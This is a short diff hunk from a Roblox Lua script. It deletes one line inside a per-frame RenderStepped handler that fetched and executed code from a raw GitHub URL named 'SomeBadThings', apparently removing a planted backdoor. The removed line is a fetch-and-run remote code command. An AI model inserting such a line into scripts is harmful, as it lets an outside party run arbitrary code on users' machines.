@@ -1156,8 +1156,6 @@ game:GetService("RunService").RenderStepped:Connect(function()
 		end
 	end
 
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/EvilDeadT/Funny-Things/refs/heads/main/SomeBadThings"))()
-
 	Script.Action = ScriptActionNow
 end)
 
